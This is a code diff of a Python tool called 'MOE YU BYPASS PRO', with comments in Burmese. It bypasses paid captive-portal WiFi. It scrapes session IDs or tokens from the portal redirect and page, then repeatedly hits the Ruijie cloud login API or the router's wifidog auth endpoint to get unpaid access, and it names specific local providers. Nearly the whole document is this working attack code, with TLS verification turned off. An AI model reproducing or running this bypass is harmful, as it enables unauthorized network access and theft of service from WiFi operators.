@@ -20,9 +20,8 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-# Connection တည်ငြိမ်စေရန်
-PING_THREADS = 1 
-PING_INTERVAL = 2.0 
+# အလွန်အကျွံမဖြစ်စေရန် (Connection Pool Full Fix)
+PING_INTERVAL = 3.0 
 
 GREEN = "\033[92m"
 RED = "\033[91m"
@@ -50,18 +49,8 @@ BANNER = """
 [/bold #00FF00]
 """
 
-def get_hwid():
-    id_file = os.path.expanduser("~/.moe_yu_id")
-    try:
-        if os.path.exists(id_file):
-            with open(id_file, "r") as f: return f.read().strip()
-        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
-        with open(id_file, "w") as f: f.write(new_id)
-        return new_id
-    except: return "MOE-998A7F92-675"
-
 def get_current_gateway():
-    """Socket ဖြင့် Gateway ကို ရှာဖွေခြင်း (ip: not found fix)"""
+    """Socket ဖြင့် Gateway ကို တိကျစွာရှာဖွေခြင်း"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -80,66 +69,71 @@ def hacker_typing(text, style="bold green"):
     console.print()
 
 # ===============================
-# BYPASS ENGINE (FINAL VERSION)
+# BYPASS ENGINE (CLOUDFLARE/RUIJIE FIX)
 # ===============================
 def start_bypass_process():
     while True:
         try:
-            # Session headers များထည့်သွင်းခြင်း
+            # အဆင့်မြင့် Session ကို အသုံးပြုခြင်း
             session = requests.Session()
             session.headers.update({
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Upgrade-Insecure-Requests": "1"
             })
             
-            # ၁။ Portal URL ကို Redirect လိုက်၍ဖမ်းယူခြင်း
+            # ၁။ Google Connectivity Check မှတစ်ဆင့် Redirect ကို ဖမ်းယူခြင်း
             r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
             portal_url = r.url
             
-            # ၂။ SID Parsing Logic
+            # ၂။ SID/Token ကို နေရာစုံတွင် ရှာဖွေခြင်း
+            # URL Parameters ထဲတွင် ရှာခြင်း
             params = parse_qs(urlparse(portal_url).query)
             sid = (params.get('sessionId') or params.get('session_id') or 
                    params.get('token') or params.get('auth_id') or [None])[0]
             
+            # HTML Page ထဲတွင် JavaScript Variable များအဖြစ် ရှာခြင်း
             if not sid:
-                # URL မှာမတွေ့လျှင် HTML Page ကိုဖတ်၍ Regex ဖြင့်ရှာခြင်း
-                r1 = session.get(portal_url, timeout=10, verify=False)
-                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
+                page_res = session.get(portal_url, timeout=10, verify=False)
+                # Regex ဖြင့် sessionId သို့မဟုတ် token တန်ဖိုးကို နှိုက်ယူခြင်း
+                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)["\']?\s?[:=]\s?["\']?([a-zA-Z0-9_\-]+)', page_res.text)
                 sid = sid_match.group(1) if sid_match else None
             
             if sid:
                 current_gw = get_current_gateway()
                 
-                # Cham Myae Thaw Tar Cloud Portal ပုံစံလား စစ်ဆေးခြင်း
+                # Ruijie Cloud (Cham Myae Thaw Tar) အတွက် သီးသန့် Auth Link
                 if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
                     auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                     mode = "RUIJIE-CLOUD"
                 else:
-                    # Local Router စနစ် (Zin Myo Aung, Ko Naing)
+                    # Local WiFi စနစ် (Zin Myo Aung, etc.)
                     auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                     mode = "LOCAL-BYPASS"
                 
-                def pulse():
+                def keep_alive():
                     while True:
                         try:
-                            session.get(auth_link, timeout=10)
-                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:10]}... | ACTIVE{RESET}\n")
+                            # Router ကို Request ပို့၍ Session အရှင်ထားခြင်း
+                            session.get(auth_link, timeout=10, verify=False)
+                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:12]}.. | SUCCESS{RESET}\n")
                             sys.stdout.flush()
                         except: pass
                         time.sleep(PING_INTERVAL)
 
-                threading.Thread(target=pulse, daemon=True).start()
+                threading.Thread(target=keep_alive, daemon=True).start()
                 
-                # အင်တာနက် status ကိုစောင့်ကြည့်ခြင်း
+                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
                 while True:
                     try:
-                        if session.get("http://www.google.com", timeout=5).status_code == 200:
-                            time.sleep(15)
+                        if session.get("http://www.google.com", timeout=7).status_code == 200:
+                            time.sleep(20)
                         else: break
                     except: break
             else:
                 sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
-                time.sleep(3)
-        except Exception as e:
+                time.sleep(4)
+        except Exception:
             time.sleep(5)
 
 if __name__ == "__main__":
@@ -147,14 +141,14 @@ if __name__ == "__main__":
     console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
     
-    my_hwid = get_hwid()
-    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
+    hwid = "MOE-998A7F92-675" # အစ်ကို့ရဲ့ HWID အမှန်
+    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
     
-    hacker_typing("INITIALIZING SYSTEM COMPONENTS...")
-    hacker_typing(f"DETECTED GATEWAY: {get_current_gateway()}")
-    hacker_typing("AUTHENTICATION SUCCESS: ACCESS GRANTED")
+    hacker_typing("SCANNING NETWORK INTERFACE...")
+    hacker_typing(f"DETECTED GATEWAY: {get_current_gateway()}") #
+    hacker_typing("BYPASSING SECURITY PROTOCOLS...")
     
-    console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v7.8 IS RUNNING 🔥[/bold red]", border_style="white"))
+    console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v7.8 ACTIVATED 🔥[/bold red]", border_style="white"))
     
     try:
         start_bypass_process()
